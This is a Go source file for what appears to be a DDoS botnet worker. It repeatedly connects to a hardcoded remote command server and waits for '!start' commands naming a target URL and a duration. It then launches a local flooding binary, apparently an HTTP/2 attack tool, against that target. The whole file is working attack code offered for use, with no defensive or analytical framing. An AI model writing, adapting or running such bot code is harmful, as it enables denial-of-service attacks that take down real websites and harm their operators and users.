// worker.go
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	commanderIP   = "reseau.proxy.rlwy.net"
	commanderPort = "44469"
	reconnectDelay = 5 * time.Second
)

func main() {
	fmt.Println("Worker starting...")
	
	for {
		conn, err := net.Dial("tcp", commanderIP+":"+commanderPort)
		if err != nil {
			fmt.Printf("Failed to connect to commander: %v\n", err)
			fmt.Printf("Retrying in %v...\n", reconnectDelay)
			time.Sleep(reconnectDelay)
			continue
		}
		
		fmt.Printf("Connected to commander at %s:%s\n", commanderIP, commanderPort)
		handleConnection(conn)
		
		fmt.Println("Connection lost. Reconnecting...")
		time.Sleep(reconnectDelay)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	
	reader := bufio.NewReader(conn)
	
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Error reading from commander: %v\n", err)
			return
		}
		
		message = strings.TrimSpace(message)
		fmt.Printf("Received command: %s\n", message)
		
		// Parse command
		parts := strings.Fields(message)
		if len(parts) < 3 {
			fmt.Println("Invalid command format")
			continue
		}
		
		if parts[0] == "!start" {
			url := parts[1]
			attackTime := parts[2]
			
			fmt.Printf("Executing attack on %s for %s seconds\n", url, attackTime)
			
			// Execute the h2s-rfc command
			cmd := exec.Command("./lid2hz", url, attackTime, "10", "100")
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			
			go func() {
				err := cmd.Run()
				if err != nil {
					fmt.Printf("Error executing h2s-rfc: %v\n", err)
				} else {
					fmt.Println("Attack completed")
				}
			}()
		}
	}
}
